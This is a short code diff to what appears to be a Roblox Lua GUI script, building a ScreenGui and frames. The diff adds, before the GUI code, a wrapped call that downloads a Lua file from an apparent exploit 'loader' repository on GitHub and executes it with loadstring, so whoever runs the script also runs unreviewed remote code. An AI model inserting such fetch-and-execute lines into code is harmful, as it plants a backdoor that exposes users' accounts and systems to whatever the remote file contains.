@@ -1,4 +1,8 @@
 -- e
+pcall(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/voidsaken-script/Voidsaken-Loader/refs/heads/main/babyBlueArchive.lua"))();
+end);
+
 local ScreenGui = Instance.new("ScreenGui")
 local main = Instance.new("Frame")
 local inner = Instance.new("Frame")
